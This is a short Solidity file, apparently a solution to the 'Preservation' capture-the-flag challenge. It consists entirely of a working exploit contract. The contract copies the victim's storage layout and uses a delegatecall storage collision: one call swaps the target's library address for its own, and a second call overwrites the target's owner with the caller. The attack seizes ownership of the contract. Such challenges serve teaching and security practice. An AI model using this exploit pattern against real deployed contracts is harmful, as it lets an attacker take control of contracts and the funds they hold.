// ---- Solution ---- //

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;

    function setSecondTime(uint256 _timeStamp) external;
}

contract PreservationHack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function attack(IPreservation preservation) public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(uint256(_owner)));
    }
}
